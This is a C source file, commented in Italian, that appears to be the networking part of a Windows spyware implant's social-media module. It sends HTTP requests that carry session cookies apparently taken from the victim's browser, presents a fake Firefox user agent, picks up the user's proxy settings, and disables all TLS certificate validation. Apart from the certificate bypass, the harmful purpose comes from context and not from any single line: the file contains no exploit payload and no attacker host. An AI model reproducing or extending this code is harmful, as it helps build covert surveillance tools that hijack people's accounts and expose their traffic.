#include <Windows.h>
#include <stdio.h>
#include <winhttp.h>
#include "..\common.h"
#include "NetworkHandler.h"
#include "SocialMain.h"

HINTERNET g_http_social_session = 0;

// Invia una richiesta HTTP e legge la risposta
// Alloca il buffer con la risposta (che va poi liberato dal chiamante)
DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies)
{
	WCHAR *cookies_w;
	DWORD cookies_len;
	DWORD dwStatusCode = 0;
	DWORD dwTemp = sizeof(dwStatusCode);
	DWORD n_read;
	char *types[] = { "*\x0/\x0*\x0",0 };
	HINTERNET hConnect, hRequest;
	BYTE *ptr;
	DWORD flags = 0;
	BYTE temp_buffer[8*1024];

	// Manda la richiesta
	cookies_len = strlen(cookies);
	if (cookies_len == 0)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	cookies_len++;
	cookies_w = (WCHAR *)calloc(cookies_len, sizeof(WCHAR));
	if (!cookies_w)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	_snwprintf_s(cookies_w, cookies_len, _TRUNCATE, L"%S", cookies);		
	if (port == 443)
		flags = WINHTTP_FLAG_SECURE;

	if ( !(hConnect = FNC(WinHttpConnect)( g_http_social_session, (LPCWSTR) Host, (INTERNET_PORT)port, 0))) {
		SAFE_FREE(cookies_w);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	if ( !(hRequest = FNC(WinHttpOpenRequest)( hConnect, verb, resource, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, flags)) ) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	if (!FNC(WinHttpAddRequestHeaders)(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!FNC(WinHttpAddRequestHeaders)(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!FNC(WinHttpSendRequest)(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, s_buffer, sbuf_len, sbuf_len, NULL))  {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	SAFE_FREE(cookies_w);

	// Legge la risposta
	if(!FNC(WinHttpReceiveResponse)(hRequest, 0)) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL ))  {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (dwStatusCode != HTTP_STATUS_OK) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	*response_len = 0;
	*r_buffer = NULL;
	for(;;) {
		if (!FNC(WinHttpReadData)(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
			break;
		if (!(ptr = (BYTE *)realloc((*r_buffer), (*response_len) + n_read + sizeof(WCHAR))))
			break;
		*r_buffer = ptr;
		memcpy(((*r_buffer) + (*response_len)), temp_buffer, n_read);
		*response_len = (*response_len) + n_read;
		// Null-termina sempre il buffer
		memset(((*r_buffer) + (*response_len)), 0, sizeof(WCHAR));
     } 

	if (!(*r_buffer)) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	return SOCIAL_REQUEST_SUCCESS;
}


void SocialWinHttpSetup(WCHAR *DestURL)
{
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig;
	WINHTTP_PROXY_INFO ProxyInfoTemp, ProxyInfo;
	WINHTTP_AUTOPROXY_OPTIONS OptPAC;
	DWORD dwOptions = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

	ZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));

	// Crea una sessione per winhttp.
    g_http_social_session = FNC(WinHttpOpen)( L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);

	// Cerca nel registry le configurazioni del proxy
	if (g_http_social_session && FNC(WinHttpGetIEProxyConfigForCurrentUser)(&ProxyConfig)) {
		if (ProxyConfig.lpszProxy) {
			// Proxy specificato
			ProxyInfo.lpszProxy = ProxyConfig.lpszProxy;
			ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			ProxyInfo.lpszProxyBypass = NULL;
		}

		if (ProxyConfig.lpszAutoConfigUrl) {
			// Script proxy pac
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
			OptPAC.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
			OptPAC.dwAutoDetectFlags = 0;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (FNC(WinHttpGetProxyForUrl)(g_http_social_session ,DestURL, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		if (ProxyConfig.fAutoDetect) {
			// Autodetect proxy
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
			OptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpszAutoConfigUrl = NULL;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (FNC(WinHttpGetProxyForUrl)(g_http_social_session ,DestURL, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		if (ProxyInfo.lpszProxy) 		
			FNC(WinHttpSetOption)(g_http_social_session, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo));
	}
	
	 WinHttpSetOption( g_http_social_session, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof (DWORD) ); 
}
